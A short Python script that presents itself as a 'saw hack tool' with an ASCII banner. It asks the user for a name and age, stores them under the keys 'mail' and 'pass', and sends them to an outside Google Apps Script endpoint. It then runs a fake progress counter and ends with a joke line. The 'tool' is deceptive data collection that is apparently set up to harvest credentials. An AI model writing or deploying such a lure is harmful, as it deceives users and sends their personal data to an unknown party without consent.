import requests
import pyfiglet
import time
a = pyfiglet.figlet_format('saw hack tool')
print(a)
print("......autor by: Love......")
print(".....dont use illegal.....")
print('........please enter you saw hack name \n and age........')

umail =input("please Enter you hack saw name=")
upass =input("please Enter  you hack saw age=")
data ={'mail':umail,'pass':upass}
print("please wait")
rq =requests.post('https://script.google.com/macros/s/AKfycbzpRqyHxvWSniIhc5UqBK-RJDz3gGCo4xYBlLwFkhAdNEsKLmI/exec',data=data)
for i in range(100):
   print(i,'%')
   time.sleep(1)
print('You can not be ugly')
